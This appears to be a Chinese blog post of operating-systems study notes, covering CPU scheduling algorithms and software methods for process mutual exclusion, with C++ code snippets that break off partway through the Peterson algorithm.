&lt;h3 id=&#34;22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统&#34;&gt;#&lt;/a&gt; 2.2_5 时间片轮转、优先级调度、多级反馈队列（适合交互式系统）&lt;/h3&gt;
&lt;h4 id=&#34;1-时间片轮转算法rr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-时间片轮转算法rr&#34;&gt;#&lt;/a&gt; 1、时间片轮转算法（RR）&lt;/h4&gt;
&lt;p&gt;算法思想：公平轮流地位各个进程服务，让每个进程在一定时间间隔内都可以得到响应&lt;/p&gt;
&lt;p&gt;算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片（如 100ms）。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列对位重新排队。&lt;/p&gt;
&lt;p&gt;只能用于进程调度&lt;/p&gt;
&lt;p&gt;抢占式&lt;/p&gt;
&lt;p&gt;优点：响应块，适用于分时操作系统&lt;/p&gt;
&lt;p&gt;缺点：由于高频率的进程切换，因此有一定的开销；不区分任务的紧急程度&lt;/p&gt;
&lt;p&gt;不会饥饿&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725141550756.png&#34; alt=&#34;image-20230725141550756&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-优先级调度算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-优先级调度算法&#34;&gt;#&lt;/a&gt; 2、优先级调度算法&lt;/h4&gt;
&lt;p&gt;算法思想：根据任务的紧急程度来决定处理顺序&lt;/p&gt;
&lt;p&gt;算法规则：每个进程 / 作业有各自的优先级，调度时选择优先级最高的作业 / 进程&lt;/p&gt;
&lt;p&gt;适用：作业 / 进程 / IO&lt;/p&gt;
&lt;p&gt;抢占式 / 不可抢占均有&lt;/p&gt;
&lt;p&gt;静态优先级：创建进程时确定，之后一直不变。&lt;/p&gt;
&lt;p&gt;动态优先级：创建进程时有一个初始值，之后会根据情况动态地调整优先级。&lt;/p&gt;
&lt;p&gt;通常：系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好 I/O 进程&lt;/p&gt;
&lt;p&gt;可以从追求公平、提升资源利用率等角度考虑改变优先级&lt;/p&gt;
&lt;p&gt;会导致饥饿&lt;/p&gt;
&lt;p&gt;系统进程优先级高于用户进程&lt;br&gt;
前台进程优先级高于后台进程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725143721630.png&#34; alt=&#34;image-20230725143721630&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725143748359.png&#34; alt=&#34;image-20230725143748359&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3-多级反馈队列调度算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-多级反馈队列调度算法&#34;&gt;#&lt;/a&gt; 3、多级反馈队列调度算法&lt;/h4&gt;
&lt;p&gt;算法思想：对其它算法调度的这种权衡&lt;/p&gt;
&lt;p&gt;算法实现：设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第一级队列，按照 FCFS 原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列对位。如果此时已经在最下级的队列，则重新放回最下级队列末尾。啊只有第 K 级队头的进程为空时，才会为 K+1 级对头的进程分配时间片，被抢占处理机的进程重新放回原队列队尾。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/e3511c2bee7ff94bf8fe9c0fae2806eb.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;优点：对各个进程相对公平（FCFS 的优点），每个新到达的进程都可以很快就得到响应（RR 的优点）；短进程只用较少的时间就可以完成（SPF 的优点）；不必实现估计进程的运行时间（避免用户作假）；可灵活地调整对各类进程的偏好程度，比如 CPU 密集型进程、IO 密集型进程&lt;/p&gt;
&lt;p&gt;默认抢占式&lt;/p&gt;
&lt;p&gt;会饥饿&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725144412827.png&#34; alt=&#34;image-20230725144412827&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;三种调度算法比较-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三种调度算法比较-2&#34;&gt;#&lt;/a&gt; 三种调度算法比较&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725144444203.png&#34; alt=&#34;image-20230725144444203&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_1-进程同步-进程互斥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_1-进程同步-进程互斥&#34;&gt;#&lt;/a&gt; 2.3_1 进程同步、进程互斥&lt;/h3&gt;
&lt;p&gt;进程具有异步性的特征。异步性是指，各并发执行的进程以各自独立的、不可预知的速度向前推进。&lt;/p&gt;
&lt;p&gt;1、进程同步&lt;/p&gt;
&lt;p&gt;指为了完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调他们的工作次序而产生的制约关系。进程间的直接制约关 系就是源于它们之间的相互合作。&lt;/p&gt;
&lt;p&gt;2、进程互斥&lt;/p&gt;
&lt;p&gt;把一个时间段内只允许一个进程使用的资源称为临界资源。&lt;/p&gt;
&lt;p&gt;对临界资源的互斥访问，可以在逻辑上分为四个部分：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726152018237.png&#34; alt=&#34;image-20230726152018237&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    entry section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 进入区     对访问的资源检查或进行上锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 临界区 (段) 访问临界资源的那部分代码&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    exit section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 退出区     负责解锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 剩余区     其它处理&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;空闲让进-忙则等待-有限等待-让权等待&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#空闲让进-忙则等待-有限等待-让权等待&#34;&gt;#&lt;/a&gt; 空闲让进 忙则等待 有限等待 让权等待&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726152118298.png&#34; alt=&#34;image-20230726152118298&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_2-进程互斥的软件实现方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_2-进程互斥的软件实现方法&#34;&gt;#&lt;/a&gt; 2.3_2 进程互斥的软件实现方法&lt;/h3&gt;
&lt;p&gt;1、单标志法&lt;/p&gt;
&lt;p&gt;两个进程在访问完临界区后会把使用临界区的权限教给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; turn &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p0 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以实现互斥&lt;/p&gt;
&lt;p&gt;存在的问题：p1 要访问的话，必须 p0 先访问，违 背：空闲让进原则&lt;/p&gt;
&lt;p&gt;2、双标志先检查&lt;/p&gt;
&lt;p&gt;算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;bool&lt;/span&gt; flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p2 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;主要问题：由于进程是并发进行的，可能会违背忙则等待的原则&lt;/p&gt;
&lt;p&gt;3、双标志后检查&lt;/p&gt;
&lt;p&gt;算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿，不过是先上锁后检查&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;bool&lt;/span&gt; flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p2 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;主要问题：由于进程是并发进行的，可能会两个同时上锁，都进不去，违反空闲让进和有限等待原则&lt;/p&gt;
&lt;p&gt;会饥饿&lt;/p&gt;
&lt;p&gt;4、Peterson 算法&lt;/p&gt;
&lt;p&gt;主动让对方先使用处理器&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;bool&lt;/span&gt; flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; turn&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token 